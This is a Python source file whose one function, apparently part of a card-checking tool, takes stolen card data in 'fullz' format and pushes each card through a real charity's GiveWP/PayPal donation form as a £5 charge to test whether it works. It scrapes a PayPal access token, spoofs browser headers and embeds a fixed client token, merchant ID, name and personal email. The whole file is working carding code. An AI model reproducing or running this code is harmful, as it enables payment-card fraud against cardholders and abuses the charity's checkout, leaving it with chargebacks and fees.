import asyncio
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import re
from bs4 import BeautifulSoup
from FUNC.defs import *

# import requests




async def create_cvv_charge(fullz , session):
    try:
        cc , mes , ano , cvv = fullz.split("|")
        user_agent          = UserAgent().random
        random_data         = await get_random_info(session)
        fname               = random_data["fname"]
        lname               = random_data["lname"]
        email               = random_data["email"]

 # 1st requests...............................................



        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://charlenesproject.org/',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }

        params = {
            'style.label': 'paypal',
            'style.layout': 'vertical',
            'style.color': 'gold',
            'style.shape': 'rect',
            'style.tagline': 'false',
            'style.menuPlacement': 'below',
            'allowBillingPayments': 'true',
            'applePaySupport': 'false',
            'buttonSessionID': 'uid_5ee7f98057_mti6mju6ndi',
            'buttonSize': 'medium',
            'clientAccessToken': 'A21AAN2gKTZiMTeY1rLPnW784EKjCNDmOW6cpmPCMrzM4t6ZYGXjoTgNLKpTeyeWcu7pxeBD_t5ig4hLYzVlediFnPIly1ZOw',
            'clientID': 'AQ7rfJ1POUULo_rL2KzkHOtSy76MULZzHsGDTKwjg_ZfOEPHK5rosuFihdGQt4LNpwwnj-vAI9Km7wvF',
            'clientMetadataID': 'uid_6524303d9a_mti6mtc6mtc',
            'commit': 'true',
            'components.0': 'buttons',
            'components.1': 'hosted-fields',
            'currency': 'GBP',
            'debug': 'false',
            'disableFunding.0': 'credit',
            'disableSetCookie': 'true',
            'env': 'production',
            'experiment.enableVenmo': 'false',
            'flow': 'purchase',
            'fundingEligibility': 'eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6ZmFsc2V9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2UsInByb2R1Y3RzIjp7InBheUluMyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlJbjQiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfSwicGF5bGF0ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXJpYW50IjpudWxsfX19LCJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJicmFuZGVkIjpmYWxzZSwiaW5zdGFsbG1lbnRzIjpmYWxzZSwidmVuZG9ycyI6eyJ2aXNhIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJtYXN0ZXJjYXJkIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJhbWV4Ijp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJkaXNjb3ZlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOnRydWV9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0',
            'intent': 'capture',
            'locale.country': 'US',
            'locale.lang': 'en',
            'merchantID.0': 'J7EDUDPFZ3CVS',
            'platform': 'desktop',
            'renderedButtons.0': 'paypal',
            'sessionID': 'uid_6524303d9a_mti6mtc6mtc',
            'sdkCorrelationID': 'f2445589a972d',
            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVE3cmZKMVBPVVVMb19yTDJLemtIT3RTeTc2TVVMWnpIc0dEVEt3amdfWmZPRVBISzVyb3N1RmloZEdRdDRMTnB3d25qLXZBSTlLbTd3dkYmbWVyY2hhbnQtaWQ9SjdFRFVEUEZaM0NWUyZjb21wb25lbnRzPWJ1dHRvbnMsaG9zdGVkLWZpZWxkcyZkaXNhYmxlLWZ1bmRpbmc9Y3JlZGl0JmludGVudD1jYXB0dXJlJnZhdWx0PWZhbHNlJmN1cnJlbmN5PUdCUCIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6IkdpdmVXUF9TUF9QQ1AiLCJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9saHRydnJyaG9jb29wcmZ2cnZsaG1veWdhY21zdmQifX0',
            'sdkVersion': '5.0.434',
            'storageID': 'uid_dbcf5e3a57_mti6mtc6mtc',
            'supportedNativeBrowser': 'false',
            'supportsPopups': 'true',
            'vault': 'false',
        }

        response = requests.get('https://www.paypal.com/smart/buttons', params=params, headers=headers)

        pattern = r'"facilitatorAccessToken":"(.*?)"'

        match = re.search(pattern, response.text)

        if match:
            token = match.group(1)
            # print("Token:", token)
        else:
            return "Token not found"


















        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary8BDXa8mVpLTD1SGq',
            'origin': 'https://charlenesproject.org',
            'priority': 'u=1, i',
            'referer': 'https://charlenesproject.org/?givewp-route=donation-form-view&form-id=21696',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }

        params = {
            'action': 'give_paypal_commerce_create_order',
        }

        files = {
            'give-form-id': (None, '21696'),
            'give-form-hash': (None, '01d197bfa2'),
            'give_payment_mode': (None, 'paypal-commerce'),
            'give-amount': (None, '5'),
            'give-recurring-period': (None, 'undefined'),
            'period': (None, 'undefined'),
            'frequency': (None, 'undefined'),
            'times': (None, 'undefined'),
            'give_first': (None, 'Tonmoy'),
            'give_last': (None, 'Debnath'),
            'give_email': (None, 'crishniki158@gmail.com'),
            'give-cs-form-currency': (None, 'GBP'),
        }

        response = await session.post(
            'https://charlenesproject.org/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            files=files,
        )

        try:
            id= response.json()["data"]["id"]
            # print(id)
        except:
            return response
        
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': f'Bearer {token}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'paypal-client-metadata-id': '69a6d7850e60b1e4d5edfa3bd689279e',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }

        json_data = {
            'payment_source': {
                'card': {
                    'number': cc,
                    'expiry': f'{ano}-{mes}',
                    'security_code': cvv,
                    'name': 'Tonmoy Debnath',
                    'attributes': {
                        'verification': {
                            'method': 'SCA_WHEN_REQUIRED',
                        },
                    },
                },
            },
            'application_context': {
                'vault': False,
            },
        }

        response = requests.post(
            f'https://cors.api.paypal.com/v2/checkout/orders/{id}/confirm-payment-source',
            headers=headers,
            json=json_data,
        )


        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryGln4iNnCfW7rYk5G',
            'origin': 'https://charlenesproject.org',
            'priority': 'u=1, i',
            'referer': 'https://charlenesproject.org/?givewp-route=donation-form-view&form-id=21696',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }

        params = {
            'action': 'give_paypal_commerce_approve_order',
            'order': id,
            'update_amount': 'false',
        }

        files = {
            'give-form-id': (None, '21696'),
            'give-form-hash': (None, '01d197bfa2'),
            'give_payment_mode': (None, 'paypal-commerce'),
            'give-amount': (None, '5'),
            'give-recurring-period': (None, 'undefined'),
            'period': (None, 'undefined'),
            'frequency': (None, 'undefined'),
            'times': (None, 'undefined'),
            'give_first': (None, 'Tonmoy'),
            'give_last': (None, 'Debnath'),
            'give_email': (None, 'crishniki158@gmail.com'),
            'give-cs-form-currency': (None, 'GBP'),
        }

        response = await session.post(
            'https://charlenesproject.org/wp-admin/admin-ajax.php',
            params=params,
            headers=headers,
            files=files,
        )



        # print(response.text)



    
      
      
        await asyncio.sleep(0.5)
        return response

    except Exception as e:
        return str(e)
